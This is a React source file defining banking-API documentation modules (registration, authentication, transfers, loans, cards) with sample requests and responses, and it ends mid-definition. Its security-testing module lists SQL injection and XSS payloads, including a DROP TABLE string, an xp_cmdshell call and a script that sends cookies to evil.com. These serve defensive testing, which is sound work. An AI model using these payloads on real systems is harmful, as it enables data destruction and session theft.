import React, { useState, useEffect } from 'react';

const API_BASE = 'http://localhost:3001';

/* ───────────────────────────────────────────
   Module Data Definitions
   ─────────────────────────────────────────── */

const MODULES = [
  {
    id: 'registration',
    label: 'Registration',
    icon: '\u{1F4DD}',
    description: 'Customer onboarding and KYC verification flow. New users register with personal details, identity proof, and initial deposit. System validates PAN, Aadhaar, mobile OTP and creates a customer profile with a unique customer ID.',
    businessFlow: 'Customer Portal --> Fill Registration Form --> OTP Verification --> KYC Upload --> Admin Approval --> Account Created --> Welcome Email/SMS',
    dbTables: ['customers', 'accounts', 'audit_log', 'notifications'],
    endpoints: [
      {
        method: 'POST',
        url: '/api/v1/auth/register',
        description: 'Register a new customer with KYC details',
        requestBody: JSON.stringify({
          first_name: 'Rajesh',
          last_name: 'Kumar',
          email: 'rajesh.kumar@example.com',
          phone: '+919876543210',
          pan_number: 'ABCDE1234F',
          aadhaar_number: '1234-5678-9012',
          date_of_birth: '1990-05-15',
          address: '123 MG Road, Bengaluru, Karnataka 560001',
          initial_deposit: 10000.00,
          account_type: 'savings',
          otp: '456789'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          customer_id: 'CUST00012',
          account_number: 'ACC2024000012',
          message: 'Registration successful. Account pending KYC verification.',
          status: 'pending_kyc'
        }, null, 2),
        statusCodes: '201 Created, 400 Validation Error, 409 Duplicate Email/PAN, 422 Invalid OTP'
      },
      {
        method: 'POST',
        url: '/api/v1/auth/verify-otp',
        description: 'Verify mobile OTP during registration',
        requestBody: JSON.stringify({
          phone: '+919876543210',
          otp: '456789',
          purpose: 'registration'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          message: 'OTP verified successfully',
          token: 'temp_token_abc123'
        }, null, 2),
        statusCodes: '200 OK, 400 Invalid OTP, 410 OTP Expired, 429 Too Many Attempts'
      },
      {
        method: 'POST',
        url: '/api/v1/kyc/upload',
        description: 'Upload KYC documents (PAN, Aadhaar, Photo)',
        requestBody: JSON.stringify({
          customer_id: 'CUST00012',
          document_type: 'aadhaar',
          document_number: '1234-5678-9012',
          file_base64: '<base64_encoded_image>',
          file_name: 'aadhaar_front.jpg'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          document_id: 'DOC00045',
          verification_status: 'pending',
          message: 'Document uploaded. Verification in progress.'
        }, null, 2),
        statusCodes: '201 Created, 400 Invalid File, 413 File Too Large, 415 Unsupported Format'
      },
      {
        method: 'GET',
        url: '/api/v1/registration/status/:customer_id',
        description: 'Check registration and KYC approval status',
        requestBody: 'N/A (Path parameter: customer_id)',
        responseBody: JSON.stringify({
          customer_id: 'CUST00012',
          registration_status: 'approved',
          kyc_status: 'verified',
          account_status: 'active',
          approved_at: '2024-01-15T10:30:00Z'
        }, null, 2),
        statusCodes: '200 OK, 404 Customer Not Found'
      }
    ],
    validationRules: [
      'First name & last name: 2-50 chars, alphabets only',
      'Email: Valid RFC 5322 format, unique in system',
      'Phone: Indian mobile format (+91XXXXXXXXXX)',
      'PAN: Regex ^[A-Z]{5}[0-9]{4}[A-Z]$ - unique per customer',
      'Aadhaar: 12 digits, Verhoeff checksum validated',
      'Date of birth: Must be 18+ years old',
      'Initial deposit: Minimum INR 1,000 for savings, INR 10,000 for current',
      'OTP: 6 digits, expires in 5 minutes, max 3 attempts'
    ]
  },
  {
    id: 'authentication',
    label: 'Authentication',
    icon: '\u{1F510}',
    description: 'Secure login/logout with session management. Supports password-based login, OTP login, and session token validation. Implements account lockout after failed attempts and concurrent session control.',
    businessFlow: 'Enter Credentials --> Validate --> Generate JWT + Session --> Set Cookie --> Access Protected Routes --> Logout --> Invalidate Session',
    dbTables: ['customers', 'login_sessions', 'audit_log'],
    endpoints: [
      {
        method: 'POST',
        url: '/api/v1/auth/login',
        description: 'Authenticate customer with credentials',
        requestBody: JSON.stringify({
          email: 'rajesh.kumar@example.com',
          password: 'SecureP@ss123',
          device_info: { browser: 'Chrome 120', os: 'Windows 11', ip: '192.168.1.100' }
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          token: 'eyJhbGciOiJIUzI1NiIs...',
          refresh_token: 'rt_abc123def456',
          expires_in: 3600,
          customer: { id: 'CUST00012', name: 'Rajesh Kumar', last_login: '2024-01-14T18:30:00Z' }
        }, null, 2),
        statusCodes: '200 OK, 401 Invalid Credentials, 403 Account Locked, 423 Account Suspended'
      },
      {
        method: 'POST',
        url: '/api/v1/auth/logout',
        description: 'Invalidate current session and token',
        requestBody: JSON.stringify({
          token: 'eyJhbGciOiJIUzI1NiIs...',
          logout_all_devices: false
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          message: 'Logged out successfully',
          sessions_terminated: 1
        }, null, 2),
        statusCodes: '200 OK, 401 Invalid/Expired Token'
      },
      {
        method: 'POST',
        url: '/api/v1/auth/refresh-token',
        description: 'Refresh expired access token using refresh token',
        requestBody: JSON.stringify({
          refresh_token: 'rt_abc123def456'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          token: 'eyJhbGciOiJIUzI1NiIs_NEW...',
          expires_in: 3600
        }, null, 2),
        statusCodes: '200 OK, 401 Invalid Refresh Token, 403 Session Expired'
      },
      {
        method: 'POST',
        url: '/api/v1/auth/forgot-password',
        description: 'Initiate password reset via email/OTP',
        requestBody: JSON.stringify({
          email: 'rajesh.kumar@example.com',
          method: 'email'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          message: 'Password reset link sent to registered email',
          expires_in: 900
        }, null, 2),
        statusCodes: '200 OK, 404 Email Not Registered, 429 Rate Limited'
      },
      {
        method: 'PUT',
        url: '/api/v1/auth/change-password',
        description: 'Change password for authenticated user',
        requestBody: JSON.stringify({
          current_password: 'OldP@ss123',
          new_password: 'NewSecureP@ss456',
          confirm_password: 'NewSecureP@ss456'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          message: 'Password changed successfully. All other sessions terminated.'
        }, null, 2),
        statusCodes: '200 OK, 400 Weak Password, 401 Wrong Current Password, 422 Mismatch'
      }
    ],
    validationRules: [
      'Password: Min 8 chars, 1 uppercase, 1 lowercase, 1 digit, 1 special char',
      'Account lockout: After 5 consecutive failed attempts, lock for 30 minutes',
      'Session timeout: 30 minutes of inactivity',
      'Max concurrent sessions: 3 per customer',
      'JWT expiry: Access token 1 hour, Refresh token 7 days',
      'Rate limit: Max 5 login attempts per minute per IP'
    ]
  },
  {
    id: 'accounts',
    label: 'Accounts',
    icon: '\u{1F4B3}',
    description: 'Core banking account management including account creation, balance inquiry, mini-statement, full statement download, account closure, and nominee management. Supports savings, current, salary, and fixed deposit account types.',
    businessFlow: 'Create Account --> Deposit Funds --> Check Balance --> View Statement --> Transfer/Pay --> Close Account',
    dbTables: ['accounts', 'customers', 'transactions', 'audit_log'],
    endpoints: [
      {
        method: 'GET',
        url: '/api/v1/accounts',
        description: 'List all accounts for authenticated customer',
        requestBody: 'N/A (Query params: ?type=savings&status=active)',
        responseBody: JSON.stringify({
          accounts: [
            { id: 1, account_number: 'ACC2024000001', type: 'savings', balance: 150000.00, status: 'active', branch: 'MG Road' },
            { id: 2, account_number: 'ACC2024000002', type: 'current', balance: 500000.00, status: 'active', branch: 'Koramangala' }
          ],
          total: 2
        }, null, 2),
        statusCodes: '200 OK, 401 Unauthorized'
      },
      {
        method: 'POST',
        url: '/api/v1/accounts',
        description: 'Open a new bank account',
        requestBody: JSON.stringify({
          customer_id: 1,
          account_type: 'savings',
          branch_code: 'BLR001',
          initial_deposit: 10000.00,
          nominee_name: 'Priya Kumar',
          nominee_relation: 'spouse'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          account: { id: 3, account_number: 'ACC2024000003', type: 'savings', balance: 10000.00, status: 'active' },
          message: 'Account created successfully'
        }, null, 2),
        statusCodes: '201 Created, 400 Invalid Account Type, 422 Min Deposit Not Met'
      },
      {
        method: 'GET',
        url: '/api/v1/accounts/:id/balance',
        description: 'Get real-time balance for an account',
        requestBody: 'N/A (Path parameter: account_id)',
        responseBody: JSON.stringify({
          account_number: 'ACC2024000001',
          available_balance: 148500.00,
          current_balance: 150000.00,
          hold_amount: 1500.00,
          currency: 'INR',
          as_of: '2024-01-15T10:30:00Z'
        }, null, 2),
        statusCodes: '200 OK, 403 Not Account Owner, 404 Account Not Found'
      },
      {
        method: 'GET',
        url: '/api/v1/accounts/:id/statement',
        description: 'Get account statement for a date range',
        requestBody: 'N/A (Query: ?from=2024-01-01&to=2024-01-31&format=json)',
        responseBody: JSON.stringify({
          account_number: 'ACC2024000001',
          period: { from: '2024-01-01', to: '2024-01-31' },
          opening_balance: 120000.00,
          closing_balance: 150000.00,
          transactions: [
            { date: '2024-01-05', description: 'NEFT-CR-John Doe', credit: 50000.00, debit: 0, balance: 170000.00, ref: 'TXN001' },
            { date: '2024-01-10', description: 'UPI-DR-Amazon', credit: 0, debit: 2500.00, balance: 167500.00, ref: 'TXN002' }
          ],
          total_credits: 80000.00,
          total_debits: 50000.00
        }, null, 2),
        statusCodes: '200 OK, 400 Invalid Date Range, 403 Forbidden, 404 Not Found'
      },
      {
        method: 'POST',
        url: '/api/v1/accounts/:id/close',
        description: 'Close an account (zero balance required)',
        requestBody: JSON.stringify({
          reason: 'Customer request',
          transfer_remaining_to: 'ACC2024000002',
          confirmation: true
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          message: 'Account ACC2024000001 closed successfully',
          final_balance: 0.00,
          closure_reference: 'CLO2024000001'
        }, null, 2),
        statusCodes: '200 OK, 400 Non-Zero Balance, 403 Loan Linked, 422 Pending Transactions'
      }
    ],
    validationRules: [
      'Minimum balance: Savings INR 1,000 / Current INR 10,000',
      'Max accounts per customer: 5',
      'Statement date range: Max 1 year',
      'Account closure: No linked loans, no pending transactions, zero balance or transfer remaining',
      'Nominee required for all account types'
    ]
  },
  {
    id: 'transfers',
    label: 'Transfers',
    icon: '\u{1F4B8}',
    description: 'Fund transfer module supporting NEFT, IMPS, RTGS, and UPI payment modes. Each mode has different limits, processing times, and cutoff schedules. Includes beneficiary management and transaction tracking.',
    businessFlow: 'Add Beneficiary --> Select Mode (NEFT/IMPS/RTGS/UPI) --> Enter Amount --> Verify OTP --> Process Transfer --> Update Balances --> Send Notification',
    dbTables: ['transactions', 'accounts', 'customers', 'audit_log', 'notifications'],
    endpoints: [
      {
        method: 'POST',
        url: '/api/v1/transfers/neft',
        description: 'NEFT transfer (batch processing, 2-4 hour settlement)',
        requestBody: JSON.stringify({
          from_account: 'ACC2024000001',
          to_account: 'ACC2024000005',
          to_ifsc: 'SBIN0001234',
          beneficiary_name: 'Amit Sharma',
          amount: 50000.00,
          narration: 'Invoice payment #INV2024001',
          otp: '123456'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          transaction_id: 'NEFT2024011500001',
          status: 'processing',
          amount: 50000.00,
          expected_completion: '2024-01-15T14:00:00Z',
          charges: 5.00,
          message: 'NEFT transfer initiated successfully'
        }, null, 2),
        statusCodes: '201 Created, 400 Invalid IFSC, 402 Insufficient Balance, 422 Exceeds Limit, 503 NEFT Window Closed'
      },
      {
        method: 'POST',
        url: '/api/v1/transfers/imps',
        description: 'IMPS instant transfer (24x7, real-time)',
        requestBody: JSON.stringify({
          from_account: 'ACC2024000001',
          to_account: 'ACC2024000005',
          to_ifsc: 'SBIN0001234',
          beneficiary_name: 'Amit Sharma',
          amount: 100000.00,
          narration: 'Urgent payment',
          otp: '654321'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          transaction_id: 'IMPS2024011500001',
          status: 'completed',
          amount: 100000.00,
          completed_at: '2024-01-15T10:30:05Z',
          charges: 10.00,
          rrn: '401512345678'
        }, null, 2),
        statusCodes: '201 Created, 400 Validation Error, 402 Insufficient Funds, 422 Exceeds IMPS Limit (5L), 504 Timeout'
      },
      {
        method: 'POST',
        url: '/api/v1/transfers/upi',
        description: 'UPI transfer via Virtual Payment Address',
        requestBody: JSON.stringify({
          from_vpa: 'rajesh@upibank',
          to_vpa: 'amit@oksbi',
          amount: 5000.00,
          note: 'Dinner split',
          pin: '****'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          transaction_id: 'UPI2024011500001',
          status: 'completed',
          amount: 5000.00,
          upi_ref: 'UPI401512345678',
          completed_at: '2024-01-15T10:30:02Z'
        }, null, 2),
        statusCodes: '201 Created, 400 Invalid VPA, 402 Insufficient Balance, 422 Exceeds UPI Limit (1L), 408 PIN Timeout'
      },
      {
        method: 'POST',
        url: '/api/v1/transfers/rtgs',
        description: 'RTGS high-value transfer (min 2L, real-time gross settlement)',
        requestBody: JSON.stringify({
          from_account: 'ACC2024000001',
          to_account: 'ACC2024000010',
          to_ifsc: 'HDFC0001234',
          beneficiary_name: 'Priya Industries Pvt Ltd',
          amount: 500000.00,
          purpose: 'Business payment',
          narration: 'PO #PO2024001',
          otp: '789012'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          transaction_id: 'RTGS2024011500001',
          status: 'completed',
          amount: 500000.00,
          utr: 'UTIB24015000001',
          completed_at: '2024-01-15T10:31:00Z',
          charges: 25.00
        }, null, 2),
        statusCodes: '201 Created, 400 Below Min (2L), 402 Insufficient Funds, 503 RTGS Window Closed'
      },
      {
        method: 'GET',
        url: '/api/v1/transfers/:transaction_id/status',
        description: 'Track transfer status by transaction ID',
        requestBody: 'N/A (Path parameter: transaction_id)',
        responseBody: JSON.stringify({
          transaction_id: 'NEFT2024011500001',
          type: 'NEFT',
          status: 'completed',
          amount: 50000.00,
          from_account: 'ACC2024000001',
          to_account: 'ACC2024000005',
          initiated_at: '2024-01-15T10:30:00Z',
          completed_at: '2024-01-15T12:00:00Z',
          utr: 'NEFT24015000001'
        }, null, 2),
        statusCodes: '200 OK, 404 Transaction Not Found'
      }
    ],
    validationRules: [
      'NEFT: Min INR 1, Max INR 10,00,000 per transaction. Batch windows: 8AM-7PM weekdays',
      'IMPS: Min INR 1, Max INR 5,00,000 per transaction. Available 24x7x365',
      'UPI: Min INR 1, Max INR 1,00,000 per transaction. Daily limit INR 1,00,000',
      'RTGS: Min INR 2,00,000, No upper limit. Window: 7AM-6PM weekdays',
      'IFSC Code: Regex ^[A-Z]{4}0[A-Z0-9]{6}$',
      'OTP mandatory for all transfers above INR 2,000',
      'Beneficiary must be pre-registered for NEFT/RTGS (cooling period: 24 hours)',
      'Daily cumulative limit: INR 25,00,000 across all modes'
    ]
  },
  {
    id: 'bill-payment',
    label: 'Bill Payment',
    icon: '\u{1F4F1}',
    description: 'Bill payment gateway supporting electricity, water, gas, telecom, broadband, insurance, and DTH billers. Includes scheduled/recurring payments, auto-pay registration, and payment history tracking.',
    businessFlow: 'Select Biller Category --> Enter Consumer Number --> Fetch Bill --> Confirm Amount --> OTP --> Process Payment --> Generate Receipt',
    dbTables: ['bill_payments', 'accounts', 'customers', 'notifications'],
    endpoints: [
      {
        method: 'GET',
        url: '/api/v1/billers/categories',
        description: 'List all biller categories',
        requestBody: 'N/A',
        responseBody: JSON.stringify({
          categories: [
            { id: 'electricity', name: 'Electricity', billers: 45, icon: 'bolt' },
            { id: 'water', name: 'Water', billers: 12, icon: 'droplet' },
            { id: 'gas', name: 'Gas', billers: 8, icon: 'flame' },
            { id: 'telecom', name: 'Telecom', billers: 20, icon: 'phone' },
            { id: 'broadband', name: 'Broadband', billers: 15, icon: 'wifi' },
            { id: 'insurance', name: 'Insurance', billers: 30, icon: 'shield' },
            { id: 'dth', name: 'DTH', billers: 6, icon: 'tv' }
          ]
        }, null, 2),
        statusCodes: '200 OK'
      },
      {
        method: 'POST',
        url: '/api/v1/billers/fetch-bill',
        description: 'Fetch outstanding bill for a consumer number',
        requestBody: JSON.stringify({
          biller_id: 'BESCOM_KA',
          consumer_number: 'KA12345678',
          billing_unit: 'Bengaluru South'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          biller_name: 'BESCOM Karnataka',
          consumer_number: 'KA12345678',
          consumer_name: 'Rajesh Kumar',
          bill_amount: 2450.00,
          due_date: '2024-01-25',
          bill_date: '2024-01-01',
          bill_number: 'BILL2024010001',
          late_fee: 50.00
        }, null, 2),
        statusCodes: '200 OK, 400 Invalid Consumer Number, 404 Biller Not Found, 503 Biller Unavailable'
      },
      {
        method: 'POST',
        url: '/api/v1/bill-payments',
        description: 'Pay a bill from account',
        requestBody: JSON.stringify({
          biller_id: 'BESCOM_KA',
          consumer_number: 'KA12345678',
          amount: 2450.00,
          from_account: 'ACC2024000001',
          payment_mode: 'account',
          otp: '123456'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          payment_id: 'BP2024011500001',
          amount: 2450.00,
          status: 'completed',
          receipt_number: 'RCT2024011500001',
          paid_at: '2024-01-15T10:30:00Z'
        }, null, 2),
        statusCodes: '201 Created, 400 Validation Error, 402 Insufficient Balance, 409 Already Paid, 503 Payment Gateway Down'
      },
      {
        method: 'POST',
        url: '/api/v1/bill-payments/schedule',
        description: 'Schedule a recurring bill payment (auto-pay)',
        requestBody: JSON.stringify({
          biller_id: 'BESCOM_KA',
          consumer_number: 'KA12345678',
          from_account: 'ACC2024000001',
          max_amount: 5000.00,
          frequency: 'monthly',
          start_date: '2024-02-01',
          end_date: '2024-12-31'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          schedule_id: 'SCH2024000001',
          status: 'active',
          next_payment_date: '2024-02-01',
          message: 'Auto-pay registered successfully'
        }, null, 2),
        statusCodes: '201 Created, 400 Invalid Frequency, 422 Max Amount Too Low'
      },
      {
        method: 'GET',
        url: '/api/v1/bill-payments/history',
        description: 'Get bill payment history',
        requestBody: 'N/A (Query: ?from=2024-01-01&to=2024-01-31&biller_category=electricity)',
        responseBody: JSON.stringify({
          payments: [
            { id: 'BP001', biller: 'BESCOM', amount: 2450.00, date: '2024-01-15', status: 'completed', receipt: 'RCT001' },
            { id: 'BP002', biller: 'Airtel', amount: 599.00, date: '2024-01-10', status: 'completed', receipt: 'RCT002' }
          ],
          total: 2,
          total_amount: 3049.00
        }, null, 2),
        statusCodes: '200 OK, 400 Invalid Date Range'
      }
    ],
    validationRules: [
      'Consumer number: Alphanumeric, 6-20 characters',
      'Amount: Must match fetched bill amount (or partial payment if supported by biller)',
      'Auto-pay max amount: Must be greater than typical bill amount',
      'Scheduled payment: Start date must be in future',
      'OTP required for payments above INR 1,000',
      'Duplicate payment check: Same biller + consumer + amount within 24 hours blocked'
    ]
  },
  {
    id: 'loans',
    label: 'Loans',
    icon: '\u{1F3E0}',
    description: 'Loan lifecycle management covering personal loans, home loans, auto loans, and education loans. Includes loan application, eligibility check, EMI calculator, disbursement, prepayment, and loan closure.',
    businessFlow: 'Check Eligibility --> Apply for Loan --> Document Upload --> Credit Assessment --> Sanction Letter --> Accept Terms --> Disbursement --> EMI Payments --> Closure',
    dbTables: ['loans', 'customers', 'accounts', 'transactions', 'audit_log'],
    endpoints: [
      {
        method: 'POST',
        url: '/api/v1/loans/eligibility',
        description: 'Check loan eligibility based on income and credit score',
        requestBody: JSON.stringify({
          customer_id: 1,
          loan_type: 'personal',
          monthly_income: 80000.00,
          existing_emi: 5000.00,
          requested_amount: 500000.00,
          tenure_months: 36
        }, null, 2),
        responseBody: JSON.stringify({
          eligible: true,
          max_loan_amount: 1200000.00,
          offered_rate: 10.5,
          estimated_emi: 16253.00,
          credit_score: 750,
          foir: 0.42,
          message: 'You are eligible for a personal loan up to INR 12,00,000'
        }, null, 2),
        statusCodes: '200 OK, 400 Invalid Loan Type, 422 Income Below Minimum'
      },
      {
        method: 'POST',
        url: '/api/v1/loans/apply',
        description: 'Submit a new loan application',
        requestBody: JSON.stringify({
          customer_id: 1,
          loan_type: 'personal',
          amount: 500000.00,
          tenure_months: 36,
          purpose: 'Home renovation',
          disbursement_account: 'ACC2024000001',
          documents: ['salary_slip_3m', 'bank_statement_6m', 'id_proof']
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          application_id: 'LA2024000001',
          loan_id: null,
          status: 'under_review',
          expected_decision_date: '2024-01-20',
          message: 'Loan application submitted. Decision expected within 5 business days.'
        }, null, 2),
        statusCodes: '201 Created, 400 Missing Documents, 409 Existing Active Application, 422 Exceeds Eligibility'
      },
      {
        method: 'GET',
        url: '/api/v1/loans/:id/emi-schedule',
        description: 'Get EMI repayment schedule for a loan',
        requestBody: 'N/A (Path parameter: loan_id)',
        responseBody: JSON.stringify({
          loan_id: 'LN2024000001',
          loan_amount: 500000.00,
          rate_of_interest: 10.5,
          tenure_months: 36,
          emi_amount: 16253.00,
          total_interest: 85108.00,
          total_payable: 585108.00,
          schedule: [
            { month: 1, emi: 16253, principal: 11878, interest: 4375, outstanding: 488122, due_date: '2024-02-05' },
            { month: 2, emi: 16253, principal: 11982, interest: 4271, outstanding: 476140, due_date: '2024-03-05' },
            { month: 3, emi: 16253, principal: 12087, interest: 4166, outstanding: 464053, due_date: '2024-04-05' }
          ]
        }, null, 2),
        statusCodes: '200 OK, 404 Loan Not Found'
      },
      {
        method: 'POST',
        url: '/api/v1/loans/:id/prepay',
        description: 'Make a prepayment / part-payment on a loan',
        requestBody: JSON.stringify({
          loan_id: 'LN2024000001',
          amount: 100000.00,
          from_account: 'ACC2024000001',
          reduce: 'emi',
          otp: '123456'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          prepayment_id: 'PP2024000001',
          amount: 100000.00,
          new_outstanding: 364053.00,
          new_emi: 12553.00,
          remaining_tenure: 33,
          foreclosure_charges: 0,
          message: 'Prepayment processed. EMI reduced from INR 16,253 to INR 12,553.'
        }, null, 2),
        statusCodes: '201 Created, 400 Below Min Prepayment, 402 Insufficient Balance, 422 Exceeds Outstanding'
      },
      {
        method: 'POST',
        url: '/api/v1/loans/:id/close',
        description: 'Foreclose / close a loan completely',
        requestBody: JSON.stringify({
          loan_id: 'LN2024000001',
          from_account: 'ACC2024000001',
          otp: '789012'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          closure_amount: 365553.00,
          foreclosure_charges: 1500.00,
          total_paid: 367053.00,
          closure_reference: 'LC2024000001',
          noc_available_after: '2024-01-22',
          message: 'Loan closed successfully. NOC will be generated within 7 days.'
        }, null, 2),
        statusCodes: '200 OK, 400 EMI Overdue, 402 Insufficient Balance'
      }
    ],
    validationRules: [
      'Minimum loan amount: Personal INR 50K, Home INR 5L, Auto INR 1L, Education INR 1L',
      'Maximum tenure: Personal 60 months, Home 360 months, Auto 84 months, Education 180 months',
      'FOIR (Fixed Obligation to Income Ratio): Must be below 0.50',
      'Credit score: Minimum 650 for personal, 700 for home loan',
      'Prepayment: Minimum INR 10,000 or 1 EMI, whichever is higher',
      'Foreclosure: Allowed after 6 EMI payments, charges 2-4% of outstanding',
      'Processing fee: 1-2% of loan amount, non-refundable'
    ]
  },
  {
    id: 'cards',
    label: 'Cards',
    icon: '\u{1F4B3}',
    description: 'Credit and debit card management including card issuance, activation, block/unblock, limit management, PIN change, card statement, and EMI conversion for credit card transactions.',
    businessFlow: 'Apply for Card --> Verification --> Card Issued --> Activate --> Set PIN --> Use Card --> View Statement --> Block/Unblock --> Set Limits',
    dbTables: ['cards', 'customers', 'accounts', 'transactions', 'audit_log'],
    endpoints: [
      {
        method: 'GET',
        url: '/api/v1/cards',
        description: 'List all cards for the customer',
        requestBody: 'N/A (Query: ?type=credit&status=active)',
        responseBody: JSON.stringify({
          cards: [
            {
              id: 1,
              card_number: '****-****-****-4567',
              type: 'credit',
              network: 'VISA',
              status: 'active',
              credit_limit: 300000.00,
              available_limit: 245000.00,
              expiry: '12/2027',
              name_on_card: 'RAJESH KUMAR'
            },
            {
              id: 2,
              card_number: '****-****-****-8901',
              type: 'debit',
              network: 'Rupay',
              status: 'active',
              daily_limit: 100000.00,
              linked_account: 'ACC2024000001'
            }
          ]
        }, null, 2),
        statusCodes: '200 OK, 401 Unauthorized'
      },
      {
        method: 'PUT',
        url: '/api/v1/cards/:id/block',
        description: 'Block a card (temporary or permanent)',
        requestBody: JSON.stringify({
          reason: 'lost',
          block_type: 'permanent',
          request_replacement: true
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          card_id: 1,
          status: 'blocked',
          block_type: 'permanent',
          replacement_card_eta: '7-10 business days',
          message: 'Card blocked. Replacement card will be delivered to registered address.'
        }, null, 2),
        statusCodes: '200 OK, 404 Card Not Found, 409 Already Blocked'
      },
      {
        method: 'PUT',
        url: '/api/v1/cards/:id/unblock',
        description: 'Unblock a temporarily blocked card',
        requestBody: JSON.stringify({
          otp: '123456'
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          card_id: 1,
          status: 'active',
          message: 'Card unblocked successfully'
        }, null, 2),
        statusCodes: '200 OK, 400 Permanent Block Cannot Unblock, 404 Card Not Found'
      },
      {
        method: 'PUT',
        url: '/api/v1/cards/:id/limits',
        description: 'Set transaction limits for a card',
        requestBody: JSON.stringify({
          daily_limit: 50000.00,
          per_transaction_limit: 25000.00,
          international_enabled: false,
          online_enabled: true,
          contactless_enabled: true,
          atm_limit: 20000.00
        }, null, 2),
        responseBody: JSON.stringify({
          success: true,
          card_id: 1,
          limits: {
            daily: 50000.00,
            per_transaction: 25000.00,
            international: false,
            online: true,
            contactless: true,
            atm: 20000.00
          },
          message: 'Card limits updated successfully'
        }, null, 2),
        statusCodes: '200 OK, 400 Limit Exceeds Max, 404 Card Not Found'
      },
      {
        method: 'GET',
        url: '/api/v1/cards/:id/statement',
        description: 'Get credit card statement for a billing cycle',
        requestBody: 'N/A (Query: ?cycle=2024-01)',
        responseBody: JSON.stringify({
          card_number: '****-****-****-4567',
          billing_cycle: '2024-01',
          statement_date: '2024-01-25',
          due_date: '2024-02-14',
          total_due: 55000.00,
          minimum_due: 5500.00,
          available_credit: 245000.00,
          transactions: [
            { date: '2024-01-05', merchant: 'Amazon India', amount: 15000.00, category: 'Shopping', emi_eligible: true },
            { date: '2024-01-12', merchant: 'Swiggy', amount: 750.00, category: 'Food', emi_eligible: false }
          ],
          reward_points: 550,
          cashback_earned: 275.00
        }, null, 2),
        statusCodes: '200 OK, 400 Invalid Cycle Format, 404 Card Not Found'
      }
    ],
    validationRules: [
      'Card number: 16 digits, Luhn algorithm validated',
      'Daily limit: Cannot exceed card credit limit / account balance',
      'ATM withdrawal: Max INR 25,000 per day for debit, INR 50,000 for credit',
      'International transactions: Disabled by default, requires explicit enable + OTP',
      'Block reason: Required - "lost", "stolen", "damaged", "suspicious_activity"',
      'Permanent block: Cannot be unblocked, replacement card required',
      'PIN change: 4-6 digit numeric, cannot match last 3 PINs'
    ]
  },
  {
    id: 'security',
    label: 'Security',
    icon: '\u{1F6E1}',
    description: 'Security testing module covering OWASP Top 10 vulnerabilities, input validation, session security, encryption verification, access control, and audit logging. Essential for banking application compliance.',
    businessFlow: 'Identify Attack Vectors --> Prepare Payloads --> Execute Tests --> Validate Defenses --> Document Findings --> Retest After Fix',
    dbTables: ['audit_log', 'login_sessions', 'customers', 'test_cases'],
    endpoints: [
      {
        method: 'POST',
        url: '/api/v1/security/test/sql-injection',
        description: 'Test endpoint for SQL injection attack validation',
        requestBody: JSON.stringify({
          test_payloads: [
            "' OR 1=1 --",
            "'; DROP TABLE customers; --",
            "' UNION SELECT * FROM accounts --",
            "1; EXEC xp_cmdshell('dir') --",
            "admin'/*"
          ],
          target_fields: ['username', 'search', 'account_number'],
          expected_behavior: 'All payloads must be sanitized or rejected with 400 status'
        }, null, 2),
        responseBody: JSON.stringify({
          test_name: 'SQL Injection',
          total_payloads: 5,
          blocked: 5,
          passed: 0,
          result: 'PASS',
          details: [
            { payload: "' OR 1=1 --", field: 'username', result: 'blocked', status: 400, response: 'Invalid input' },
            { payload: "'; DROP TABLE customers; --", field: 'username', result: 'blocked', status: 400, response: 'Invalid input' }
          ]
        }, null, 2),
        statusCodes: '200 OK (Test Report), 401 Unauthorized (Non-admin)'
      },
      {
        method: 'POST',
        url: '/api/v1/security/test/xss',
        description: 'Test endpoint for Cross-Site Scripting (XSS) validation',
        requestBody: JSON.stringify({
          test_payloads: [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            "javascript:alert('XSS')",
            '<svg onload=alert(1)>',
            '"><script>document.location="http://evil.com/?c="+document.cookie</script>'
          ],
          target_fields: ['name', 'address', 'narration'],
          expected_behavior: 'All payloads must be encoded/escaped or rejected'
        }, null, 2),
        responseBody: JSON.stringify({
          test_name: 'XSS Prevention',
          total_payloads: 5,
          blocked: 5,
          passed: 0,
          result: 'PASS',
          details: [
            { payload: '<script>alert("XSS")</script>', field: 'name', result: 'sanitized', output: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;' }
          ]
        }, null, 2),
        statusCodes: '200 OK (Test Report)'
      },
      {
        method: 'POST',
        url: '/api/v1/security/test/csrf',
        description: 'Test CSRF token validation on state-changing endpoints',
        requestBody: JSON.stringify({
          target_endpoints: [
            { method: 'POST', url: '/api/v1/transfers/neft' },
            { method: 'PUT', url: '/api/v1/auth/change-password' },
            { method: 'POST', url: '/api/v1/bill-payments' }
          ],
          test_type: 'missing_token',
          expected_behavior: 'All requests without valid CSRF token must return 403'
        }, null, 2),
        responseBody: JSON.stringify({
          test_name: 'CSRF Protection',
          total_endpoints: 3,
          protected: 3,
          unprotected: 0,
          result: 'PASS'
        }, null, 2),
        statusCodes: '200 OK (Test Report)'
      },
      {
        method: 'GET',
        url: '/api/v1/security/audit-log',
        description: 'View security audit log (admin only)',
        requestBody: 'N/A (Query: ?from=2024-01-01&to=2024-01-31&event_type=login_failure)',
        responseBody: JSON.stringify({
          events: [
            { id: 1, event: 'login_failure', ip: '192.168.1.100', customer_id: 'CUST001', timestamp: '2024-01-15T10:00:00Z', details: 'Invalid password' },
